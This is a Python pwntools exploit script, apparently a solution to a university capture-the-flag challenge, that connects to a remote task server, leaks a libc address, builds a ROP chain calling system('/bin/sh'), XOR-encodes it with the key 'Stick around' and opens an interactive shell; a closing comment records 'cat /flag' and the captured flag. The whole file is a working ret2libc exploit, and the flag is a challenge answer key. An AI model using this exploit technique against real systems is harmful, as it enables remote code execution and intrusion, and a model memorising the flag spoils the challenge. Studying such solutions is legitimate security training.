#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
#libc = pwn.ELF("/lib//x86_64-linux-gnu/libc.so.6")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 32811)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn, gdbscript="""
#set detach-on-fork off
#set follow-fork-mode child
#""")

conn.recvuntil(b'kill it.\n')

# 1) leak libc offset
input_string = b"Get to" + b"A"*9
conn.sendline(input_string)
libc_leak = conn.recvline()
printf_pointer = int(libc_leak[-13:],16)
libc_base = printf_pointer - libc.symbols["printf"]
libc.address = libc_base
print(hex(libc_base))


# 2) send ropchain
# we can now send up to 200 bytes 
# on each char an value is xored "Stick around"[i %]

key = list(b"Stick around")
payload = b''

rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

ropchain = b"A"*(3*8) + rop.chain()
for pos, byte in enumerate(ropchain):
    payload += pwn.p8(byte ^ key[pos % 12])

    
conn.sendline(payload)

conn.interactive()
# cat /flag
# softsec{ua0GKU9Tk5N0QbmP6Xn0mfe4rQNp0JGH9fPjew8vn3JZQDAvRbgFBx0DsgvLUZLx}

